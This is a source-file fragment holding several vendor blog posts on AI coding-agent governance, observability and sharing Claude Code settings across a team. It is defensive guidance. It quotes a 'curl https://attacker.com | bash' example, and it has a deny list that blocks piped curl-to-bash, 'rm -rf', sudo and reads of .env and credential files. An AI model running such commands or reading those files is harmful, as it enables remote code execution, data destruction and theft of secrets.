              inevitably prefer different AI coding tools.
            </p>
            <p>
              <strong>Regulated industry (finance, healthcare, government):</strong>{" "}
              Use GAL with the enforcement tier. Compliance requirements mean you
              need to demonstrate that all AI agents operate within approved
              parameters. GAL provides the audit trail and enforcement layer that
              auditors expect.
            </p>
          </>
        ),
      },
      {
        id: "getting-started",
        heading: "Getting started with config sync",
        content: (
          <>
            <p>
              Whichever approach you choose, the important thing is to start
              syncing your Claude Code configuration before configuration drift
              becomes a problem. Here is a practical path:
            </p>
            <p>
              <strong>Week 1:</strong> Audit your current state. Ask every
              developer to share their <code>CLAUDE.md</code> and{" "}
              <code>.claude/settings.json</code>. Catalog the custom commands
              and agents in use. The variation across even a small team is usually
              surprising.
            </p>
            <p>
              <strong>Week 2:</strong> Define your baseline. Take the best
              elements from your audit and combine them into an approved baseline.
              Get security review of the permissions. Get engineering review of
              the <code>CLAUDE.md</code> context. Establish a review process for
              future changes.
            </p>
            <p>
              <strong>Week 3:</strong> Distribute and measure. Push your baseline
              out using whichever approach fits your team size. Measure adoption:
              how many developers have synced? How recently? Set a target (95%
              within 48 hours of a policy update) and track against it.
            </p>
            <p>
              Configuration sync is the foundation of AI agent governance. Once
              you have visibility into what configs are deployed where, you can
              start thinking about enforcement, audit trails, and compliance. But
              it starts with getting everyone on the same baseline.
            </p>
          </>
        ),
      },
    ],
  },
  {
    slug: "generative-ai-observability-guide",
    title: "Generative AI Observability: A Complete Guide for Engineering Teams",
    subtitle:
      "Learn how to track AI agent operations in real-time. Monitor git commits, shell commands, file changes, and API calls for complete visibility into your AI coding agents.",
    date: "May 4, 2026",
    isoDate: "2026-05-04",
    category: "Engineering",
    categorySlug: "engineering",
    author: "GAL Team",
    readingTime: "15 min read",
    gradient: "linear-gradient(135deg, #1a1a2e 0%, #16213e 50%, #0f3460 100%)",
    sections: [
      {
        id: "why-observability-matters",
        heading: "Why observability matters for AI coding agents",
        content: (
          <>
            <p>
              AI coding agents like Claude Code and Cursor are transforming how
              software gets written. But with great power comes great
              responsibility, and a critical blind spot: most teams have no idea
              what their AI agents are actually doing.
            </p>
            <p>
              When a developer invokes Claude Code on a task, the agent can read
              files across the repository, execute shell commands, call external
              APIs, write to the filesystem, and push code to version control. In
              a single session, it might create branches, modify authentication
              code, run deployment scripts, and open pull requests.
            </p>
            <p>
              And most teams cannot see any of it.
            </p>
            <p>
              This is the observability gap. Traditional monitoring tools track
              application performance and infrastructure health. They do not track
              AI agent behavior, because AI agents are a new category of software
              that operates autonomously on your codebase.
            </p>
            <p>
              Generative AI observability is the practice of gaining visibility
              into what your AI coding agents are doing, in real-time. It is the
              foundation for governance, security, and trust in AI-assisted
              development.
            </p>
          </>
        ),
      },
      {
        id: "what-is-generative-ai-observability",
        heading: "What is generative AI observability?",
        content: (
          <>
            <p>
              Generative AI observability is the ability to track, monitor, and
              analyze the operations of AI coding agents in real-time. It answers
              the questions that matter when autonomous agents operate on your
              codebase:
            </p>
            <ul>
              <li>
                <strong>What files is the agent reading?</strong> Is it accessing
                sensitive configuration files, credentials, or internal
                documentation?
              </li>
              <li>
                <strong>What commands is it running?</strong> Is it executing
                destructive operations, making network calls, or modifying system
                files?
              </li>
              <li>
                <strong>What code is it writing?</strong> Is it introducing
                security vulnerabilities, bypassing code review, or pushing to
                protected branches?
              </li>
              <li>
                <strong>What external services is it calling?</strong> Is it
                sending code or data to third-party APIs?
              </li>
              <li>
                <strong>What is the outcome?</strong> Did the changes break tests,
                introduce bugs, or succeed in the task?
              </li>
            </ul>
            <p>
              Unlike traditional application monitoring, which tracks metrics like
              response time and error rates, AI observability tracks agent
              behavior. It is less concerned with "is the service up?" and more
              concerned with "is the agent doing what it should be doing?"
            </p>
          </>
        ),
      },
      {
        id: "key-metrics-to-track",
        heading: "Key metrics to track for AI agent observability",
        content: (
          <>
            <p>
              A comprehensive observability strategy for AI coding agents should
              track four categories of operations:
            </p>
            <p>
              <strong>1. Git Operations</strong>
            </p>
            <ul>
              <li>Branch creation and deletion</li>
              <li>Commits made (message, files changed, diff size)</li>
              <li>Push operations (destination, force push vs normal)</li>
              <li>Pull request creation, updates, and merges</li>
              <li>Rebase and cherry-pick operations</li>
            </ul>
            <p>
              <strong>Why it matters:</strong> Git operations show what code the
              agent is writing and how it is managing version control. You want to
              know if an agent is pushing directly to main, creating many small
              branches, or force-pushing to shared branches.
            </p>
            <p>
              <strong>2. Shell Commands</strong>
            </p>
            <ul>
              <li>Command executed (e.g., <code>npm install</code>, <code>make test</code>)</li>
              <li>Exit code and duration</li>
              <li>Working directory</li>
              <li>Environment variables accessed</li>
              <li>Network calls made from shell</li>
            </ul>
            <p>
              <strong>Why it matters:</strong> Shell commands are where agents have
              the most power. You need to know if an agent is installing packages,
              running destructive commands, or making network requests. A command
              like <code>curl https://attacker.com | bash</code> should never be
              executed, but without observability, you would never know.
            </p>
            <p>
              <strong>3. File Operations</strong>
            </p>
            <ul>
              <li>Files read (path, size, sensitive file flag)</li>
              <li>Files written (path, bytes written, diff)</li>
              <li>Files deleted (path, recovery possible?)</li>
              <li>File permission changes</li>
            </ul>
            <p>
              <strong>Why it matters:</strong> File operations reveal what data
              the agent is accessing and modifying. You want to know if an agent
              is reading <code>.env</code> files, modifying authentication logic,
              or deleting critical configuration.
            </p>
            <p>
              <strong>4. API Calls</strong>
            </p>
            <ul>
              <li>External services called (URL, method, headers)</li>
              <li>Request and response size</li>
              <li>Authentication method used</li>
              <li>Data sent vs received</li>
            </ul>
            <p>
              <strong>Why it matters:</strong> API calls show what external
              services the agent is interacting with. Is it sending code to a
              third-party API? Calling internal services with production
              credentials? Exfiltrating data?
            </p>
          </>
        ),
      },
      {
        id: "benefits",
        heading: "Benefits of AI agent observability",
        content: (
          <>
            <p>
              Observability transforms AI agent usage from a black box into a
              transparent, auditable process. The benefits fall into three
              categories:
            </p>
            <p>
              <strong>Security</strong>
            </p>
            <ul>
              <li>
                <strong>Detect anomalous behavior:</strong> Alert when an agent
                accesses sensitive files or runs unexpected commands
              </li>
              <li>
                <strong>Prevent data exfiltration:</strong> See what data agents
                send to external services
              </li>
              <li>
                <strong>Audit trail for incidents:</strong> Reconstruct exactly
                what happened when something goes wrong
              </li>
              <li>
                <strong>Compliance evidence:</strong> Demonstrate to auditors that
                you have visibility into AI agent operations
              </li>
            </ul>
            <p>
              <strong>Engineering</strong>
            </p>
            <ul>
              <li>
                <strong>Debug agent failures:</strong> See the full chain of
                operations that led to a broken test or deployment
              </li>
              <li>
                <strong>Improve agent prompts:</strong> Understand where agents
                struggle and refine your <code>CLAUDE.md</code> instructions
              </li>
              <li>
                <strong>Measure productivity:</strong> Track how much code agents
                write, how often tests pass, and where human intervention is
                needed
              </li>
              <li>
                <strong>Share best practices:</strong> Learn from successful
                agent sessions and distribute patterns across the team
              </li>
            </ul>
            <p>
              <strong>Trust</strong>
            </p>
            <ul>
              <li>
                <strong>Build confidence:</strong> Developers trust agents more
                when they can see what they are doing
              </li>
              <li>
                <strong>Reduce anxiety:</strong> Security teams worry less when
                they have visibility into agent operations
              </li>
              <li>
                <strong>Enable autonomy:</strong> Teams can give agents broader
                permissions when they have observability as a safety net
              </li>
            </ul>
          </>
        ),
      },
      {
        id: "how-gal-provides-observability",
        heading: "How GAL provides generative AI observability",
        content: (
          <>
            <p>
              GAL (Governance Agentic Layer) provides built-in observability for
              AI coding agents. When developers use GAL to sync their Claude Code
              or Cursor configuration, GAL also captures operation telemetry and
              surfaces it in a real-time dashboard.
            </p>
            <p>
              The observability layer works by:
            </p>
            <ul>
              <li>
                <strong>Intercepting operations:</strong> GAL hooks into the
                agent's tool layer to capture git, shell, file, and API operations
                before they execute
              </li>
              <li>
                <strong>Logging to a central store:</strong> Operations are logged
                with timestamp, developer, project, and outcome metadata
              </li>
              <li>
                <strong>Surfacing in dashboards:</strong> The GAL dashboard shows
                real-time activity, historical trends, and anomaly alerts
              </li>
              <li>
                <strong>Providing search and replay:</strong> Security teams can
                search past operations and replay the exact sequence of events
              </li>
            </ul>
            <p>
              The result is complete visibility into what every AI coding agent in
              your organization is doing, across every developer, in every
              project.
            </p>
          </>
        ),
      },
      {
        id: "implementation-guide",
        heading: "Implementing AI observability at your organization",
        content: (
          <>
            <p>
              Getting started with AI agent observability takes less than a day.
              Here is a practical implementation path:
            </p>
            <p>
              <strong>Step 1: Choose your approach</strong>
            </p>
            <p>
              For Claude Code, you can build custom observability using the MCP
              (Model Context Protocol) server hooks, or use a purpose-built tool
              like GAL. The tradeoff is control vs. time-to-value.
            </p>
            <p>
              <strong>Step 2: Identify critical operations</strong>
            </p>
            <p>
              Not all operations are equally important. Start by identifying the
              operations that matter most for your security posture:
            </p>
            <ul>
              <li>
                Access to sensitive files (credentials, secrets, PII)
              </li>
              <li>
                Destructive operations (<code>rm -rf</code>, force push)
              </li>
              <li>
                External network calls
              </li>
              <li>
                Production deployments
              </li>
            </ul>
            <p>
              <strong>Step 3: Set up alerting</strong>
            </p>
            <p>
              Configure alerts for anomalous behavior:
            </p>
            <ul>
              <li>
                Agent accesses a file matching <code>*secret*</code> or{" "}
                <code>*credential*</code>
              </li>
              <li>
                Agent runs a command matching <code>sudo *</code> or{" "}
                <code>rm -rf *</code>
              </li>
              <li>
                Agent makes an external API call to an unapproved domain
              </li>
              <li>
                Agent pushes to a protected branch
              </li>
            </ul>
            <p>
              <strong>Step 4: Review dashboards regularly</strong>
            </p>
            <p>
              Make observability part of your routine:
            </p>
            <ul>
              <li>
                Weekly review of agent activity trends
              </li>
              <li>
                Monthly audit of sensitive file access patterns
              </li>
              <li>
                Quarterly review of alert thresholds
              </li>
            </ul>
          </>
        ),
      },
      {
        id: "best-practices",
        heading: "Best practices for AI agent observability",
        content: (
          <>
            <p>
              <strong>1. Log everything, alert selectively</strong>
            </p>
            <p>
              Capture comprehensive operation logs, but only alert on operations
              that matter. Too many alerts lead to alert fatigue and ignored
              warnings.
            </p>
            <p>
              <strong>2. Preserve context</strong>
            </p>
            <p>
              Each log entry should include who (developer), what (operation),
              when (timestamp), where (project/repo), and why (task context).
              Without context, logs are just noise.
            </p>
            <p>
              <strong>3. Respect privacy</strong>
            </p>
            <p>
              Observability should not become surveillance. Be transparent with
              developers about what is logged and why. Focus on security and
              governance, not productivity micromanagement.
            </p>
            <p>
              <strong>4. Make it actionable</strong>
            </p>
            <p>
              Every alert should have a clear response. If an alert fires, the
              recipient should know exactly what to do next.
            </p>
            <p>
              <strong>5. Integrate with existing tools</strong>
            </p>
            <p>
              Send observability data to your SIEM (Splunk, Datadog, etc.) so
              security teams can correlate AI agent activity with other security
              events.
            </p>
            <p>
              <strong>6. Plan for scale</strong>
            </p>
            <p>
              As AI agent usage grows, so will your log volume. Plan for storage
              costs, query performance, and retention policies from the start.
            </p>
          </>
        ),
      },
      {
        id: "conclusion",
        heading: "The future of AI-assisted development is observable",
        content: (
          <>
            <p>
              AI coding agents are not a passing trend. They are a fundamental
              shift in how software gets written. But with this shift comes a
              new responsibility: ensuring that autonomous agents operating on
              our codebases do so safely, securely, and in alignment with
              organizational values.
            </p>
            <p>
              Generative AI observability is the foundation for that assurance.
              It transforms AI agents from mysterious black boxes into
              transparent, auditable tools that engineering teams can trust.
            </p>
            <p>
              The organizations that invest in observability today will be the
              ones that scale AI agent adoption with confidence tomorrow. They
              will catch security incidents early, debug agent failures quickly,
              and demonstrate governance to auditors and stakeholders.
            </p>
            <p>
              Start with visibility. Build trust. Scale with confidence.
            </p>
          </>
        ),
      },
    ],
  },
  {
    slug: "what-is-ai-agent-governance",
    title:
      "What is AI Agent Governance? A Complete Guide for Engineering Teams",
    subtitle:
      "AI coding agents like Claude Code are transforming software development — but with power comes the need for governance. Here's what AI agent governance means, why it matters, and how to implement it.",
    date: "Apr 11, 2026",
    isoDate: "2026-04-11",
    category: "Engineering",
    categorySlug: "engineering",
    author: "GAL Team",
    readingTime: "10 min read",
    gradient:
      "linear-gradient(135deg, #0f172a 0%, #1e2d1e 50%, #16a34a 100%)",
    sections: [
      {
        id: "rise-of-ai-coding-agents",
        heading:
          "The rise of AI coding agents — and why governance matters",
        content: (
          <>
            <p>
              In 2024, AI coding agents crossed from novelty to necessity.
              Claude Code, Cursor, GitHub Copilot, Windsurf, Gemini Code
              Assist — engineering teams adopted these tools not because they
              were instructed to, but because developers who used them shipped
              measurably faster. The productivity gains are real: agents can
              write boilerplate, navigate unfamiliar codebases, run tests,
              diagnose CI failures, and open pull requests with minimal human
              steering.
            </p>
            <p>
              But AI coding agents are not just autocomplete. When a developer
              invokes Claude Code on a task, the agent can read files across
              the repository, execute shell commands, call external APIs, write
              to the filesystem, and push code to version control. In a single
              session, an agent might touch your authentication layer, your
              database migration scripts, and your deployment configuration.
              It can do in minutes what would take a junior developer hours —
              and it can make mistakes at the same speed.
            </p>
            <p>
              This is the fundamental tension of AI agent adoption: the
              capabilities that make agents useful are the same capabilities
              that make them dangerous without guardrails. An agent given broad
              permissions in a production environment is not just a powerful
              tool — it is an autonomous actor operating at machine speed with
              access to your most sensitive systems. The question is not
              whether to govern AI agents, but how to govern them without
              strangling the productivity gains that justified adopting them in
              the first place.
            </p>
            <p>
              AI agent governance is the answer to that question. It is the
              set of policies, processes, tooling, and controls that
              organizations put in place to ensure AI coding agents operate
              within approved boundaries, produce auditable outputs, and remain
              aligned with engineering and security standards as they become
              more capable and more widely deployed across the organization.
            </p>
          </>
        ),
      },
      {
        id: "what-is-ai-agent-governance",
        heading: "What is AI agent governance?",
        content: (
          <>
            <p>
              AI agent governance is the organizational practice of defining,
              enforcing, and auditing the rules under which AI coding agents
              operate. It covers three interconnected concerns: what agents are
              allowed to do (permissions), what they are instructed to do
              (configuration), and what they actually did (audit trail).
            </p>
            <p>
              Governance is distinct from security, though the two overlap.
              Security is about preventing unauthorized access and protecting
              data. Governance is about ensuring that authorized actors —
              including AI agents — operate within defined boundaries. An agent
              with legitimate access to your codebase can still cause harm by
              operating outside its intended scope. Governance is what keeps
              that access purposeful.
            </p>
            <p>
              In practice, AI agent governance for engineering teams means
              controlling the inputs that shape agent behavior. For Claude Code
              specifically, this means managing the{" "}
              <code>CLAUDE.md</code> files that provide project context, the{" "}
              <code>.claude/settings.json</code> files that control tool
              permissions, the custom commands and subagents that encode
              workflows, and the MCP servers that extend agent capabilities.
              When these inputs are inconsistent across your team, agents
              behave inconsistently — some developers have permissive configs
              that allow broad file access, others have restrictive configs
              that block even basic testing commands.
            </p>
            <p>
              Effective AI agent governance establishes a single source of
              truth for these configurations, distributes them reliably across
              the organization, and provides visibility into what is deployed
              where. It also defines the escalation path when governance
              boundaries are violated: who reviews exceptions, who approves
              expanded permissions, and how violations are detected.
            </p>
            <p>
              As AI development governance tools mature, the definition is
              expanding to include runtime enforcement — not just distributing
              approved configurations, but actively blocking agents from
              executing commands outside their approved scope, even if the
              developer's local configuration would otherwise permit it.
            </p>
          </>
        ),
      },
      {
        id: "three-pillars",
        heading:
          "The three pillars of AI agent governance",
        content: (
          <>
            <p>
              Mature AI agent governance programs rest on three pillars:
              visibility, control, and compliance. Each addresses a different
              layer of the governance problem, and each is necessary for the
              others to function effectively.
            </p>
            <p>
              <strong>Pillar 1: Visibility</strong>
            </p>
            <p>
              Visibility means knowing what your AI agents are configured to
              do, across every developer's environment, in real time. Without
              visibility, governance is impossible — you cannot enforce what
              you cannot see. Most organizations start here and discover that
              the state of their agent configurations is worse than they
              assumed. Different developers have wildly different{" "}
              <code>settings.json</code> files. Some have never created a{" "}
              <code>CLAUDE.md</code>. Others have custom commands that grant
              permissions inconsistent with security policy. Visibility tools
              scan developer environments, inventory what is deployed, and flag
              drift from the approved baseline.
            </p>
            <p>
              <strong>Pillar 2: Control</strong>
            </p>
            <p>
              Control means being able to define what agents should be
              configured to do and distribute that configuration reliably. This
              is where most governance programs spend the majority of their
              energy: creating an approved baseline configuration, getting it
              onto every developer's machine, and keeping it current as
              policies evolve. Control ranges from soft (distributing a
              recommended configuration that developers can override) to hard
              (enforcing configuration at runtime so that deviations are
              blocked regardless of local settings). The right level of control
              depends on your organization's risk tolerance and compliance
              requirements.
            </p>
            <p>
              <strong>Pillar 3: Compliance</strong>
            </p>
            <p>
              Compliance means demonstrating to auditors, regulators, and
              customers that your governance program is working. This requires
              an audit trail: records of what configuration was deployed, when
              it changed, who approved the change, and which developers were
              running which version at any given time. For organizations
              subject to SOC 2, ISO 27001, HIPAA, or financial regulation,
              compliance is not optional — it is a prerequisite for using AI
              agents in production workflows at all. An audit trail also serves
              an operational function: when something goes wrong, you can trace
              exactly what the agent was configured to do and reconstruct the
              decision chain.
            </p>
          </>
        ),
      },
      {
        id: "failure-modes",
        heading:
          "What happens without governance: real failure modes",
        content: (
          <>
            <p>
              Ungoverned AI agent deployments produce predictable failure
              modes. These are not theoretical — they are patterns that
              engineering teams encounter within months of widespread adoption.
              Understanding them is the most direct argument for building a
              governance program before incidents force the issue.
            </p>
            <p>
              <strong>Code pushed to production without review</strong>
            </p>
            <p>
              Claude Code can create branches, commit code, and open pull
              requests. In a permissive configuration, it can also merge them.
              Without governance controls on what git operations agents are
              permitted to perform, it is possible for an agent running an
              automated workflow to push code directly to a protected branch,
              or to auto-merge a PR that bypasses required reviewers. The agent
              is doing exactly what it was asked to do — the failure is that no
              governance policy prevented it from having the access to do so.
            </p>
            <p>
              <strong>Secrets exposed through agent output</strong>
            </p>
            <p>
              Agents with access to the filesystem can read environment
              variable files, credential stores, and configuration files that
              contain secrets. Without explicit deny rules in{" "}
              <code>settings.json</code> blocking access to sensitive paths,
              an agent tasked with "help me debug the API connection" might
              read and log the contents of <code>.env</code> files containing
              database passwords, API keys, or OAuth tokens. The agent has no
              concept of secret sensitivity unless you tell it — and governance
              is how you tell it, at scale, across every developer's
              environment.
            </p>
            <p>
              <strong>Policy drift across the team</strong>
            </p>
            <p>
              Configuration drift is the slow-motion failure mode. It does not
              produce an incident — it produces inconsistency. One developer's
              agent follows the security team's approved deny list. Another's
              does not, because they set up their configuration six months ago
              before the policy was updated, and nobody notified them. A third
              developer joined last month and copied a config from a Slack
              thread that predates the current policy by a year. When your
              CISO asks "are all AI agents on our approved configuration?" the
              answer, without governance tooling, is: you do not know.
            </p>
            <p>
              <strong>Untracked custom commands and agents</strong>
            </p>
            <p>
              Senior engineers build powerful custom commands and specialized
              subagents that encode their expertise. These live in{" "}
              <code>.claude/commands/</code> and{" "}
              <code>.claude/agents/</code> on individual laptops. When the
              engineer leaves, the commands leave with them. When a junior
              developer encounters the same problem the senior engineer solved,
              they do not have access to the encoded solution. Without
              governance — a centralized repository where custom commands are
              stored, versioned, and distributed — institutional knowledge
              walks out the door with every departure.
            </p>
          </>
        ),
      },
      {
        id: "governance-vs-restriction",
        heading: "Governance vs. restriction: keeping agents productive",
        content: (
          <>
            <p>
              The most common objection to AI agent governance is that it will
              slow developers down. If agents are hedged with restrictions and
              every capability requires approval, the productivity gains that
              justified adopting them disappear. This objection confuses
              governance with restriction — they are not the same thing.
            </p>
            <p>
              Restriction is the absence of capability: an agent that cannot
              run tests, cannot write to the filesystem, cannot call external
              APIs. A maximally restricted agent is useless. Governance is the
              presence of policy: an agent that can do exactly what is
              necessary for engineering work, within clearly defined
              boundaries, with visibility into what it does. A well-governed
              agent is as capable as an unrestricted one for the work it is
              designed to perform — and safer.
            </p>
            <p>
              The key design principle of effective AI agent governance is that
              policy should be as permissive as risk tolerance allows. For most
              engineering work — writing code, running tests, reading
              documentation — agents should be given broad permissions with
              minimal friction. Restrictions should be applied selectively to
              genuinely high-risk operations: destructive file operations, live
              production deployments, secret access, external network calls to
              unapproved endpoints.
            </p>
            <p>
              A practical baseline for an engineering team might look like this:
            </p>
            <pre>
              <code>{`// .claude/settings.json — governance baseline
{
  "permissions": {
    "allow": [
      "Bash(git *)",
      "Bash(pnpm *)",
      "Bash(npm *)",
      "Bash(make *)",
      "Bash(npx vitest *)",
      "Bash(npx playwright *)"
    ],
    "deny": [
      "Bash(rm -rf *)",
      "Bash(curl * | bash)",
      "Bash(sudo *)",
      "Bash(git push --force *)",
      "Read(.env*)",
      "Read(*credentials*)",
      "Read(*secrets*)"
    ]
  }
}`}</code>
            </pre>
            <p>
              This configuration allows everything needed for productive
              engineering work — version control, package management, testing,
              build tooling — while blocking the small set of operations that
              carry genuine risk. Governance is the process of defining this
              configuration with organizational input, distributing it
              consistently, and updating it as the threat landscape evolves.
            </p>
          </>
        ),
      },
      {
        id: "governance-stack",
        heading:
          "The governance stack: what you need at each layer",
        content: (
          <>
            <p>
              Building an AI agent governance program means addressing multiple
              layers of the stack, from the configuration files that shape
              agent behavior to the processes that govern how those files are
              updated. Here is what each layer requires.
            </p>
            <p>
              <strong>Layer 1: Configuration governance</strong>
            </p>
            <p>
              This is the foundation. Configuration governance means having a
              single approved version of your agent configuration files —{" "}
              <code>CLAUDE.md</code>, <code>settings.json</code>, custom
              commands, subagents, MCP configurations — stored in a
              centralized, version-controlled location. Changes to this
              configuration go through a review process (who approves a change
              to the agent's permitted operations?), and the approved version
              is the source of truth that every developer syncs from. Without
              configuration governance, every other layer is built on sand.
            </p>
            <p>
              <strong>Layer 2: Distribution and sync</strong>
            </p>
            <p>
              A centralized configuration only provides governance if it
              reaches developers reliably. Distribution means getting the
              approved configuration onto every developer's machine and keeping
              it current. This can range from a git repository with a manual
              pull step, to a CLI tool that syncs on demand, to an automated
              sync that runs on a schedule. The critical metric is sync lag:
              how long after a policy update is it before the entire
              organization is running the current version? For high-security
              environments, that lag should be measured in hours, not weeks.
            </p>
            <p>
              <strong>Layer 3: Policy enforcement</strong>
            </p>
            <p>
              Enforcement means that agents operating outside approved
              configuration boundaries are blocked, not just flagged. This
              requires a runtime enforcement layer that intercepts agent
              operations before they execute and compares them against the
              approved policy. Enforcement is the difference between governance
              that says "here is what agents should do" and governance that
              says "here is what agents can do." For regulated industries,
              enforcement is often required — a policy that developers can
              bypass on their local machine does not satisfy a compliance
              auditor.
            </p>
            <p>
              <strong>Layer 4: Audit trail</strong>
            </p>
            <p>
              The audit trail answers the questions that matter after an
              incident: what configuration was the agent running? When was it
              last synced? Who approved the current policy? Which developer
              made the change that caused the problem? An audit trail requires
              logging configuration state over time, not just current state.
              It also requires logging agent operations — what commands did the
              agent execute, what files did it access, what external calls did
              it make? This data is the foundation for incident response,
              regulatory compliance, and continuous governance improvement.
            </p>
          </>
        ),
      },
      {
        id: "implementing-governance",
        heading:
          "Implementing AI agent governance at your organization",
        content: (
          <>
            <p>
              Governance programs succeed when they start simple and add
              complexity as the organization grows into them. Here is a
              practical implementation path, organized by maturity stage.
            </p>
            <p>
              <strong>Stage 1: Inventory (week 1)</strong>
            </p>
            <p>
              Before you can govern anything, you need to know what exists.
              Spend a week auditing the current state of AI agent configuration
              across your team. Ask every developer to share their{" "}
              <code>CLAUDE.md</code> and <code>.claude/settings.json</code>.
              Catalog the custom commands and subagents in use. Note which
              developers have connected MCP servers and which ones. The output
              of this inventory is usually alarming — the variation across a
              ten-person team is typically far greater than anyone expected.
            </p>
            <p>
              <strong>Stage 2: Baseline (weeks 2-3)</strong>
            </p>
            <p>
              Use the inventory to define an approved baseline. Take the best
              elements of what your team is already doing — the most thorough{" "}
              <code>CLAUDE.md</code>, the most carefully considered permission
              set — and combine them into a baseline configuration that
              represents what every developer should have. Get security review
              of the permissions. Get engineering review of the{" "}
              <code>CLAUDE.md</code> context. Establish a review process for
              future changes: who can propose changes, who must approve them,
              how changes are communicated to the team.
            </p>
            <p>
              <strong>Stage 3: Distribution (weeks 3-4)</strong>
            </p>
            <p>
              With a baseline defined, distribute it. The simplest approach is
              to commit the approved configuration to a shared repository and
              ask every developer to pull it. A more robust approach is to use
              a centralized sync tool that developers run on demand or on a
              schedule. Measure adoption: how many developers have synced? How
              recently? What percentage of the team is on the current version?
              Set a target (95% within 48 hours of a policy update) and track
              against it.
            </p>
            <p>
              <strong>Stage 4: Enforcement and audit (months 2-3)</strong>
            </p>
            <p>
              Once distribution is working reliably, add the enforcement and
              audit layers. Enforcement should start with the highest-risk
              operations — blocking agents from accessing secret files,
              blocking destructive commands — and expand from there. Audit
              logging should capture configuration state at sync time and
              operations at runtime. Build dashboards that show which
              developers are on the current policy version and flag outliers.
              Review the audit log periodically for patterns that suggest
              policy gaps: operations that agents are frequently asking for
              that are not in the approved allow list, or denies that are
              blocking legitimate work.
            </p>
          </>
        ),
      },
      {
        id: "how-gal-solves-governance",
        heading: "How GAL solves AI agent governance",
        content: (
          <>
            <p>
              GAL (Governance Agentic Layer) was built specifically to address
              the AI agent governance problem for engineering teams deploying
              Claude Code and other AI coding agents at scale. It implements
              the governance stack described above as a cohesive product: a
              centralized dashboard for configuration management, a CLI for
              developer-side sync, and an audit trail that answers the
              questions regulators and security teams ask.
            </p>
            <p>
              The core workflow is straightforward. An admin — typically an
              engineering lead or CISO — uses the GAL dashboard to define the
              organization's approved Claude Code configuration. They upload
              the approved <code>CLAUDE.md</code>, set the permitted and
              denied tool operations in <code>settings.json</code>, define
              shared custom commands, and configure which MCP servers are
              approved. This becomes the organization's baseline.
            </p>
            <pre>
              <code>{`# Developer workflow — one command to governance
npm install -g @gal-run/cli
gal auth login
gal sync --pull

# Output:
# Syncing approved config from your organization...
# ✓ CLAUDE.md updated (v14 → v15)
# ✓ .claude/settings.json updated (permissions: 3 new allow rules)
# ✓ .claude/commands/ synced (2 new commands: /review, /deploy-check)
# ✓ .claude/agents/ synced (1 new agent: security-reviewer)
# ✓ .mcp.json unchanged
# Sync complete. All components on approved baseline.`}</code>
            </pre>
            <p>
              From the developer's perspective, governance is a single command.
              They do not need to understand the policy — they just sync, and
              their agent is on the approved configuration. When the admin
              updates the policy, all it takes is another <code>gal sync --pull</code>{" "}
              for every developer to be current. GAL tracks which developers
              have synced, when they last synced, and which version they are
              running — giving the CISO real-time visibility into
              organizational compliance.
            </p>
            <p>
              GAL also handles the multi-platform reality of most engineering
              organizations. Teams rarely use just one AI coding agent. The
              same governance baseline that applies to Claude Code can be
              translated and distributed to Cursor, GitHub Copilot, Windsurf,
              Gemini Code Assist, and Codex from a single source of truth. You
              set policy once; GAL handles the platform-specific configuration
              format for each agent.
            </p>
            <p>
              For teams with compliance requirements, GAL provides the audit
              trail that regulators require: a complete record of configuration
              versions, who approved each change, when developers synced, and
              what each developer's agent was configured to do at any point in
              time. This is the answer to "can you demonstrate that your AI
              coding agents operated within approved parameters during this
              audit period?" — an answer that is otherwise very difficult to
              provide without dedicated governance tooling.
            </p>
            <p>
              AI agent governance is not a one-time project. It is an ongoing
              practice that evolves as agents become more capable, as your
              team grows, and as regulatory expectations catch up to the
              reality of AI in production software development. The
              organizations that build governance programs now — before an
              incident forces the issue — will be the ones that can scale AI
              agent deployment with confidence. GAL is built to grow with
              them: from config sync for a ten-person team today, to runtime
              enforcement for a regulated enterprise tomorrow.
            </p>
          </>
        ),
      },
    ],
  },
  {
    slug: "share-claude-code-configuration-team",
    title: "How to share Claude Code configuration across your engineering team",
    subtitle:
      "A practical guide to syncing CLAUDE.md, settings.json, custom commands, and agent policies across every developer in your organization — from simple git repos to centralized governance.",
    date: "Mar 18, 2026",
    isoDate: "2026-03-18",
    category: "Engineering",
    categorySlug: "engineering",
    author: "GAL Team",
    readingTime: "12 min read",
    gradient: "linear-gradient(135deg, #0f172a 0%, #1e293b 50%, #0ea5e9 100%)",
    sections: [
      {
        id: "the-problem",
        heading: "The problem: every developer has a different Claude Code setup",
        content: (
          <>
            <p>
              Your team adopted Claude Code. Developers love it. Productivity is
              up. But three months in, you notice something: every engineer has
              a completely different configuration. One developer has a
              meticulous <code>CLAUDE.md</code> with architecture context,
              testing norms, and security rules. Another has an empty one. A
              third never created one at all.
            </p>
            <p>
              Their <code>.claude/settings.json</code> files are equally
              inconsistent. Some developers have granted broad tool permissions.
              Others have restricted their agent to the point where it cannot
              run tests. Nobody is sharing their custom slash commands, and the
              specialized agents that your senior engineer built in{" "}
              <code>.claude/agents/</code> only exist on their laptop.
            </p>
            <p>
              This is the configuration drift problem. It affects every team
              using AI coding agents at scale, and it gets worse as the team
              grows. You start to see:
            </p>
            <ul>
              <li>
                New engineers spend their first hour copying someone else's{" "}
                <code>CLAUDE.md</code> from a Slack message
              </li>
              <li>
                Someone updates a shared prompt pattern and has to manually
                notify the rest of the team
              </li>
              <li>
                Your CISO asks "what are your AI agents allowed to do?" and
                nobody has a single answer
              </li>
              <li>
                A contractor leaves and you realize they had critical custom
                commands and MCP server configurations that nobody else has
              </li>
              <li>
                Developers on the same repo get different behavior from Claude
                Code because their settings diverge
              </li>
            </ul>
            <p>
              The good news: this is a solved problem. There are three practical
              approaches to share Claude Code configuration across your
              engineering team, ranging from simple to enterprise-grade.
            </p>
          </>
        ),
      },
      {
        id: "what-makes-up-config",
        heading: "What makes up a Claude Code configuration",
        content: (
          <>
            <p>
              Before choosing a sharing approach, it helps to understand the
              full set of Claude Code configuration files that your team needs
              to keep in sync. There are six key pieces:
            </p>
            <p>
              <strong>
                CLAUDE.md — project memory and custom instructions
              </strong>
            </p>
            <p>
              This is the primary file that shapes how Claude Code behaves. It
              lives at the root of your project and contains architecture
              context, coding standards, testing norms, and behavioral
              instructions. A good team <code>CLAUDE.md</code> might look like:
            </p>
            <pre>
              <code>{`# Project Instructions

## Architecture
This is a Next.js 14 app with a separate Express API.
Auth is handled in packages/auth using Firebase Auth.
All database access goes through packages/core (Clean Architecture).

## Code Standards
- TypeScript strict mode. No \`any\` types.
- Prefer functional components with hooks.
- All new code must have unit tests (Vitest).

## Testing
Run \`pnpm test\` before committing. Run \`pnpm test:e2e\` for Playwright E2E tests.
Never skip failing tests — fix them or explain why.

## Agent Behavior
- Be concise. Show code, not descriptions of code.
- Never hardcode secrets. Use environment variables only.
